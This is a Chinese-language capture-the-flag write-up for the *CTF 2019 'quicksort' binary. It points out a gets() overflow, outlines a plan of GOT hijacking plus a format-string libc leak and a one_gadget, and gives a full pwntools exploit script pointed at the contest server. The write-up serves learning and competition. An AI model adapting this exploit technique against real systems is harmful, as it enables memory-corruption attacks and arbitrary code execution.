
---
title: Starctf2019_Quicksort
date: 2019-04-29 11:27:25
tags:
---
挺简单的一题...但是我的利用思路...可能有些曲折..
<!--more-->
# Start
[binary][1]
# Anaylsis
漏洞点很简单...gets...我第一眼居然没看到以为是类型设置错误...

```arm
 for ( i = 0; i < size; ++i )
  {
    printf("the %dth number:", i + 1);
    gets(&s);
    tmp = &ptr[i];
    *tmp = (int *)atoi(&s);
  }
```
可以覆盖掉其他东西...
然后学弟写了一会...表示不知道咋利用...我就接手了交flag的活...

# 利用思路
我的可能比较奇特...改成了fmt漏洞
* hijack stack_chk_fail_got =====>main
* hijack free_got           =====>printf
* fmtstr                    =====>leak libc
* one_gadget
# exp
```python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
#context.terminal = ['tmux', 'sp', '-h']
local = 1
if 0:
	p = process('./quicksort')
else:
	p=remote("34.92.96.238",10000)    
elf = ELF('./quicksort')
g = lambda x: next(elf.search(asm(x)))
ret = g('ret') # 0x8048816
puts_plt = elf.plt['puts'] # 0x8048560
puts_got = elf.got['puts'] # 0x804a02c
free_got = elf.got['free'] # 0x804a018
printf = elf.plt['printf'] # 
func = 0x08048816
stack_chk_fail_got = elf.got['__stack_chk_fail']
setbuf_got = elf.got['setbuf']


def write(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr)
	p.recvuntil('number:')
	p.sendline(payload)

def overflow(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr) + '\x00' * 4
	p.recvuntil('number:')
	p.sendline(payload)
bss=0x0804a000+0x800
p.recvuntil('sort?\n')
t = 2
p.sendline(str(t))
write(free_got, printf, 2)
overflow(stack_chk_fail_got, 0x8048816, 1)

p.recvuntil('sort?\n')
p.sendline(str(t))
overflow(bss, 1881420837, 1)
p.readuntil("37 \n")
base=int(p.read(0xa),16)-(0xf7791000-0xf75df000)
log.warning(hex(base))
#gdb.attach(p, 'b *0x80489bf')
one=0x3ac62+base
p.recvuntil('sort?\n')
p.sendline(str(t))
write(stack_chk_fail_got, one&0xffff, 2)
overflow(stack_chk_fail_got+2, (one&0xffff0000)>>16, 1)


p.interactive()
```

[1]:https://github.com/n132/Watermalon/tree/master/Starctf_2019